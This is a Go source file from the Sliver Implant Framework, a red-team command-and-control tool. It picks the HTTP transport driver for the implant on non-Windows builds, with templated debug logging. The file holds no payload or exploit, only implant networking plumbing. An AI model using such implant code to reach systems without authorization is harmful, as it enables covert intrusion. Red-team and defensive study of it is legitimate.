//go:build !windows

package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// GetHTTPDriver - Get an instance of the specified HTTP driver
func GetHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, error) {
	switch opts.Driver {

	case goHTTPDriver:
		return GoHTTPDriver(origin, secure, opts)

	default:
		// {{if .Config.Debug}}
		log.Printf("WARNING: unknown HTTP driver: %s", opts.Driver)
		// {{end}}
		return GoHTTPDriver(origin, secure, opts)
	}
}
